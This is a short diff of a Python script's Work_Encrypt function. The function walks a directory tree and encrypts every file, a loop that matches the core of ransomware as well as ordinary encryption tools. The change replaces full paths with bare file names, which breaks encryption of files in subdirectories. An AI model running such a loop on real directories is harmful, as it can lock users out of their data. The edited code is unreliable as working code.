@@ -25,8 +25,7 @@ def Encrypt(filename):
 def Work_Encrypt(rootDir): 
     list_dirs = os.walk(rootDir) 
     for root, dirs, files in list_dirs: 
-        if True:
-            for f in files: 
-                filename = os.path.join(root, f)
-                print("Encrypt the file: " + filename)
-                Encrypt(filename)
+        for f in files: 
+            # filename = os.path.join(root, f)
+            print("Encrypt the file: " + f)
+            Encrypt(f)
